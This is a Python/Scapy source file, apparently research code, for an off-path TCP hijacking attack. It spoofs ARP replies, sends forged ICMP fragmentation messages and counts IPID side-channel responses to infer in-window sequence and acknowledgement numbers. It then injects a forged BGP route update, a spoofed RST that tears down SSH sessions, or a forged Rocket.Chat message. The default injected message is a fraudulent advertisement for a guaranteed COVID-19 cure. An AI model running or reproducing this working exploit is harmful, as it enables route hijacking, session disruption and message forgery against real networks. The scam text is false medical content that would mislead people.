# coding=utf-8

import socket
import struct
import threading
import time
from scapy.all import *
from scapy.layers.inet import *
from scapy.layers.l2 import *

from  IPID_HCSC.webscoket_gen import get_websocket_messege

TCP_INVALID_RATELIMIT = 0.5

class Ack_Finder:

    def __init__(self, forge_ip, client_port, server_port, seq_in_win, server_mac, bind_if_name='ens33',
                 client_ip='10.10.100.1', server_ip='10.10.100.2', block_size=80100):

        self.forge_ip = forge_ip
        self.victim_ip = client_ip
        self.server_ip = server_ip
        self.server_port = server_port
        self.client_port = client_port

        self.seq_in_win = seq_in_win
        self.ack_check_start = -1
        self.ack_left_bound = -1
        self.ack_in_win = -1
        self.seq_num = -1

        self.bind_if_name = bind_if_name
        self.server_mac_addr =server_mac
        self.my_mac_addr = get_if_hwaddr(bind_if_name)
        self.__z_payload = b''
        for i in range(0, 520):
            self.__z_payload += struct.pack('B', 0)

        self.BLOCK = block_size
        self.__sleep_time = TCP_INVALID_RATELIMIT
        self.__finish = False

        self.send_n = 0
        self.send_byte = 0
        self.cost_time = -1

    def arp_inject(self):
        pkt = sniff(filter="arp " + "and dst " + self.forge_ip + " and ether src " + self.server_mac_addr,
                    iface=self.bind_if_name, timeout=0.5, count=1, started_callback=
                    lambda: send(IP(src=self.forge_ip, dst=self.server_ip) / UDP(dport=80),
                                 iface=self.bind_if_name, verbose=False))

        if len(pkt) == 1 and pkt[0][1].fields['psrc'] == self.server_ip and pkt[0][1].fields['pdst'] == self.forge_ip:
            send(ARP(pdst=self.server_ip, hwdst=self.server_mac_addr, psrc=self.forge_ip, hwsrc=self.my_mac_addr, op=2),
                 iface=self.bind_if_name, verbose=False)

        time.sleep(1)

        if not self.__finish:
            ts = threading.Thread(target=self.arp_inject)
            ts.start()

    def tcp_fragment(self):
        send(IP(src=self.forge_ip, dst=self.server_ip) /
             ICMP(type=3, code=4, nexthopmtu=68) /
             IP(flags=2, src=self.server_ip, dst=self.victim_ip) /
             ICMP(type=0, code=0) /
             self.__z_payload,
             iface=self.bind_if_name, verbose=False)

        time.sleep(1)

        if not self.__finish:
            tr = threading.Thread(target=self.tcp_fragment)
            tr.start()

    def check_new_list(self, list_p):
        C = len(list_p)
        L = 0

        icmp_seq = random.randint(0, (1 << 16) - 1)
        send_list = [IP(src=self.forge_ip, dst=self.server_ip) / ICMP(id=icmp_seq)]
        for ac in list_p:
            send_list.append(IP(src=self.victim_ip, dst=self.server_ip) /
                             TCP(sport=self.client_port, dport=self.server_port, seq=self.seq_in_win, ack=ac, flags='A'))
            send_list.append(IP(src=self.forge_ip, dst=self.server_ip) / ICMP(id=icmp_seq))

        for pkg in send_list:
            L += len(pkg)

        while True:
            self.send_n += len(send_list)
            self.send_byte += L
            pkts = sniff(filter="icmp and icmp[4:2]=" + str(icmp_seq) + " and dst " + self.forge_ip,
                         iface=self.bind_if_name, count=1 + C, timeout=1.5, started_callback=
                         lambda: send(send_list, iface=self.bind_if_name, verbose=False))
            if len(pkts) != 1 + C:
                time.sleep(self.__sleep_time)
            else:
                break

        ipids = []
        for pk in pkts:
            ipids.append(pk[1].fields['id'])

        list_next = []
        for i in range(1, C + 1):
            if ipids[i] - ipids[i - 1] >= 2:
                list_next.append(list_p[i - 1])

        return list_next

    def check_new_point_seq(self, list_p):
        C = len(list_p)
        L = 0
        icmp_seq = random.randint(0, (1 << 16) - 1)

        send_list = [IP(src=self.victim_ip, dst=self.server_ip) /
                     TCP(sport=self.client_port, dport=self.server_port, seq=self.seq_in_win,
                         ack=self.ack_check_start, flags='A'),
                     IP(src=self.forge_ip, dst=self.server_ip) / ICMP(id=icmp_seq)]
        for sq in list_p:
            send_list.append(IP(src=self.victim_ip, dst=self.server_ip) /
                             TCP(sport=self.client_port, dport=self.server_port, seq=sq,
                                 ack=self.ack_check_start, flags='A') / 'a')
            send_list.append(IP(src=self.forge_ip, dst=self.server_ip) / ICMP(id=icmp_seq))
        for pkg in send_list:
            L += len(pkg)
        while True:
            self.send_n += len(send_list)
            self.send_byte += L
            pkts = sniff(filter="icmp and icmp[4:2]=" + str(icmp_seq) + " and dst " + self.forge_ip,
                         iface=self.bind_if_name, count=1 + C, timeout=1.5, started_callback=
                         lambda: send(send_list, iface=self.bind_if_name, verbose=False))
            if len(pkts) != 1 + C:
                time.sleep(self.__sleep_time)
            else:
                break

        ipids = []
        for pk in pkts:
            ipids.append(pk[1].fields['id'])

        list_next = []
        for i in range(1, C + 1):
            if ipids[i] - ipids[i - 1] < 2:
                list_next.append(list_p[i - 1])

        return list_next

    def find_seq(self):

        rb = self.seq_in_win
        lb = self.seq_in_win - (self.BLOCK * 2)
        D = 6

        ans = -1
        while rb >= lb:
            mid = int((lb + rb) / 2)
            in_bound = True
            n = 0
            for i in range(0, D):
                if len(self.check_new_point_seq([mid])) == 0:
                    n += 1

            if n > 1:
                in_bound = False

            if in_bound:
                ans = mid
                rb = mid - 1
            else:
                lb = mid + 1

        self.seq_num = ans
        print('Seq next: ' + str(self.seq_num))
        self.__finish = True

    def check_new_point_ack(self, list_p):
        C = len(list_p)
        L = 0

        icmp_seq = random.randint(0, (1 << 16) - 1)
        send_list = [IP(src=self.forge_ip, dst=self.server_ip) / ICMP(id=icmp_seq)]
        for ac in list_p:
            send_list.append(IP(src=self.victim_ip, dst=self.server_ip) /
                             TCP(sport=self.client_port, dport=self.server_port, seq=self.seq_in_win, ack=ac, flags='A'))
            send_list.append(IP(src=self.forge_ip, dst=self.server_ip) / ICMP(id=icmp_seq))

        for pkg in send_list:
            L += len(pkg)

        while True:
            self.send_n += len(send_list)
            self.send_byte += L
            pkts = sniff(filter="icmp and icmp[4:2]=" + str(icmp_seq) + " and dst " + self.forge_ip,
                         iface=self.bind_if_name, count=1 + C, timeout=1.5, started_callback=
                         lambda: send(send_list, iface=self.bind_if_name, verbose=False))
            if len(pkts) != 1 + C:
                time.sleep(self.__sleep_time)
            else:
                break

        ipids = []
        for pk in pkts:
            ipids.append(pk[1].fields['id'])

        list_next = []
        for i in range(1, C + 1):
            if ipids[i] - ipids[i - 1] >= 2:
                list_next.append(list_p[i - 1])

        if len(list_next) == 0:
            return None
        else:
            return list_next[0]

    def __C(self, ls, lb, rb):
        D = 2
        # revise
        for i in range(0, len(ls)):
            ls[i] = ls[i] if ls[i] >= 0 else ls[i] + (1 << 32)

        in_bound = lb
        for i in range(0, D):
            time.sleep(self.__sleep_time)
            nb = self.check_new_point_ack(ls)
            if nb is None:
                i -= 1
            else:
                in_bound = max(in_bound, nb)

        return in_bound

    def find_left_bound_ack(self):
        rb = self.ack_check_start
        lb = rb - (1 << 31)
        L = 50

        while (rb - lb) >= L:
            step = int((rb - lb) / L)
            ls = [lb]
            for i in range(0, L - 1):
                ls.append(ls[-1] + step)
            ls.append(rb)

            in_bound = self.__C(ls, lb, rb)
            rb = in_bound
            lb = rb - step

        ls = list(range(lb, rb + 1))
        ans = self.__C(ls, lb, rb)

        self.ack_left_bound = ans if ans >= 0 else ans + (1 << 32)
        self.ack_in_win = (self.ack_left_bound + (1 << 31)) & ((1 << 32) - 1)
        print('ACK in win: ' + str(self.ack_in_win))

    def find_ack_challenge_win(self):
        check_points = [0]
        for i in range(0, 3):
            check_points.append(check_points[-1] + (1 << 30))

        for i in range(0, 3):
            new_check_points = self.check_new_list(check_points)
            check_points = list(set(check_points) & set(new_check_points))
            time.sleep(self.__sleep_time)

        check_points.sort()
        self.ack_check_start = check_points[0]
        print('Challenge ACK: ' + str(self.ack_check_start))

    def run_attack_bgp(self):
        ts = threading.Thread(target=self.arp_inject)
        ts.start()

        tr = threading.Thread(target=self.tcp_fragment)
        tr.start()
        s_t = time.time()
        print('------ ACK/SEQ Find ------')
        self.find_ack_challenge_win()
        self.find_left_bound_ack()
        self.find_seq()
        e_t = time.time()
        self.cost_time = e_t - s_t

        print('Send Packets: ' + str(self.send_n))
        print('Send Bytes: ' + str(self.send_byte) + ' (Bytes)')
        print('Cost Time: ' + str(e_t - s_t) + ' (s)')
        time.sleep(self.__sleep_time)

    def run_attack_ssh(self):
        ts = threading.Thread(target=self.arp_inject)
        ts.start()

        tr = threading.Thread(target=self.tcp_fragment)
        tr.start()

        print('------ SEQ Find ------')
        s_t = time.time()
        self.find_ack_challenge_win()
        self.find_seq()
        e_t = time.time()
        self.cost_time = e_t - s_t

        print('Send Packets: ' + str(self.send_n))
        print('Send Bytes: ' + str(self.send_byte) + ' (Bytes)')
        print('Cost Time: ' + str(e_t - s_t) + ' (s)')

    def run_attack_rocket_chat(self):
        ts = threading.Thread(target=self.arp_inject)
        ts.start()

        tr = threading.Thread(target=self.tcp_fragment)
        tr.start()
        s_t = time.time()
        print('------ ACK/SEQ Find ------')
        self.find_ack_challenge_win()
        self.find_left_bound_ack()
        self.find_seq()
        e_t = time.time()
        self.cost_time = e_t - s_t

        print('Send Packets: ' + str(self.send_n))
        print('Send Bytes: ' + str(self.send_byte) + ' (Bytes)')
        print('Cost Time: ' + str(e_t - s_t) + ' (s)')
        time.sleep(self.__sleep_time)


def attack_action_bgp(client_ip, server_ip, client_port, server_port, seq, ack, ifname='ens33'):
    one_payload = b''
    for i in range(0, 16):
        one_payload += struct.pack('B', (1 << 8) - 1)

    # basic BGP update message
    ll = 55
    type = 2
    WRL = 0
    attr_len = 28
    hd_bgp = struct.pack('!HBHH', ll, type, WRL, attr_len)

    # attr1
    flag1 = 0x40
    type1 = 1
    len1 = 1
    origin1 = 0
    attr1 = struct.pack('!BBBB', flag1, type1, len1, origin1)

    # attr2
    flag2 = 0x50
    type2 = 2
    len2 = 6
    seg_type = 2
    seg_len = 1
    AS4 = 1
    attr2 = struct.pack('!BBHBBL', flag2, type2, len2, seg_type, seg_len, AS4)

    # attr3
    flag3 = 0x40
    type3 = 3
    len3 = 4
    next_hop = socket.inet_aton('10.10.100.1')
    attr3 = struct.pack('!BBB4s', flag3, type3, len3, next_hop)

    # attr4
    flag4 = 0x80
    type4 = 4
    len4 = 4
    load = 0
    attr4 = struct.pack('!BBBL', flag4, type4, len4, load)

    # address info
    prefix_len = 24
    network_addr = socket.inet_aton('11.11.11.0')
    b_network = struct.pack('!B3s', prefix_len, network_addr[:3])

    bgp_payload = one_payload + hd_bgp + attr1 + attr2 + attr3 + attr4 + b_network

    send_list = []
    send_list.append(IP(src=client_ip, dst=server_ip, tos=0xc0) /
                     TCP(sport=client_port, dport=server_port, seq=seq + 1, ack=ack, flags='PA') /
                     bgp_payload)

    send(send_list, iface=ifname, verbose=False)
    print('Send Forged BGP Update Message.')

def attack_action_ssh(client_ip, server_ip, client_port, server_port, seq, ifname='ens33'):
    print('Send RST Shutdown SSH.')
    send(IP(src=client_ip, dst=server_ip, tos=0xc0) /
         TCP(sport=client_port, dport=server_port, seq=seq + 1, flags='R'),
         iface=ifname, verbose=False)


def attack_action_rocketchat(client_ip, server_ip, client_port, server_port, seq, ack,
                             room_id, forged_message='', ifname='ens33'):
    if len(forged_message) == 0:
        forged_message = '------ 100% 2019-nCoV Treatment!!! ------\r\n' + \
                         '- 15 minutes to Diagnosis 2019 new Coronavirus,\r\n' + \
                         '  the minimum cost is only 325$!!!!!!\r\n' + \
                         '- 3 days to cure new coronavirus with 100%\r\n' + \
                         '  success rate. The minimum cost is only 4096$!!!\r\n\r\n' + \
                         'We have Advanced Medical Equipments and Specific \r\n' + \
                         'Medicine which is hard to buy on public markets.\r\n' + \
                         'Our Treatment will give you life-long immunity.\r\n\r\n' + \
                         'If you need our help or more details please contact\r\n' + \
                         'Doctor Feng at 16723452345.\r\n'

    load = get_websocket_messege(forged_message=forged_message, room_id=room_id)

    send_list = []
    send_list.append(IP(src=client_ip, dst=server_ip) /
                     TCP(sport=client_port, dport=server_port, seq=seq + 1, ack=ack, flags='PA') /
                     load)

    send(send_list, iface=ifname, verbose=False)